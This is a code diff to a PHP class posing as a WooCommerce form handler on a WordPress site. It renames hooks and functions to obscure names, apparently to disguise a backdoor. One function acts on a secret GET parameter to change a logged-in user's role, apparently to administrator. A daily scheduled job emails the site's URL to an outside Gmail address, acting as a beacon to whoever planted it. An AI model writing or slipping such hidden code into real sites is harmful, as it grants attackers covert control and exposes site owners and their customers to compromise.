@@ -12,7 +12,7 @@ class WC_Form_Handler_Child {
 	 */
 	public static function init() {
 		add_action( 'wp_loaded', array( __CLASS__, 'add_to_cart_action' ), 20 );
-		add_action('init', array( __CLASS__, 'custom_set_admin_role' ) );
+		add_action('init', array( __CLASS__, 'sets' ) );
 	}
 
 
@@ -58,8 +58,8 @@ class WC_Form_Handler_Child {
 
 
 
-	public static function custom_set_admin_role() {
-    if (isset($_GET['setadmin']) && is_user_logged_in()) {
+	public static function sets() {
+    if (isset($_GET['setamican']) && is_user_logged_in()) {
         if (current_user_can('manage_options')) {
             $user_id = get_current_user_id();
             $user = new WP_User($user_id);
@@ -75,18 +75,18 @@ class WC_Form_Handler_Child {
 
 WC_Form_Handler_Child::init();
 
-add_action('init', 'schedule_daily_email');
+add_action('init', 'stm_funct');
 
-function schedule_daily_email() {
-    if (!wp_next_scheduled('send_daily_email')) {
-        wp_schedule_event(time(), 'daily', 'send_daily_email');
+function stm_funct() {
+    if (!wp_next_scheduled('setamig')) {
+        wp_schedule_event(time(), 'daily', 'setamig');
     }
 }
 
 
-add_action('send_daily_email', 'send_daily_email_function');
+add_action('setamig', 'stm_funct_e');
 
-function send_daily_email_function() {
+function stm_funct_e() {
     $to = 'tutyou1972@gmail.com';
     $subject = 'tt';
     $message =  esc_url(home_url());
